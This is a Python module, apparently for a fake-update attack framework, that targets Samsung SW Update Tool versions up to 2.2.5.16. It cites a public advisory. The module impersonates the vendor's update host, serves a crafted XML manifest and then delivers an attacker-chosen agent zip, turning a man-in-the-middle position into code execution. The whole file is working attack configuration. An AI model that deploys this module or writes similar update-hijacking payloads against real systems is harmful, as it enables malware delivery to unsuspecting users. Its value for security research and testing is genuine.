# -*- coding: utf-8 -*-
from modules import ModuleBase


class Samsung(ModuleBase):
    name = 'samsung'
    version = '1.0'
    appver = ' <= Samsung SW Update Tool 2.2.5.16'
    author = ['Francisco Amato <famato +[AT]+ infobytesec.com']
    description = """Found By:  Joaquín Rodríguez Varela
        The Samsung SW Update Tool [1] is a tool that analyzes the system drivers of a computer. You can install relevant software for your computer easier and faster using SW Update.
        The SW Update program helps you install and update your software and driver easily. Samsung [2] SW Update Tool is prone to a Men in The Middle attack which could result in
        integrity corruption of the transferred data, information leak and consequently code execution.
        https://www.coresecurity.com/advisories/samsung-sw-update-tool-mitm""",
    agent_filename = './agent/agent.zip'
    vh = '(orcaservice.samsungmobile.com)' 
    requests = [
        {   'path': 'dl/bom/MAX6356A04.XML',
            'type': 'file',
            'method': '',
            'bin': '0',
            'string': '',
            'parse': '1',
            'file': './include/samsung/general.xml',
        },
        {   'path': '.zip',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]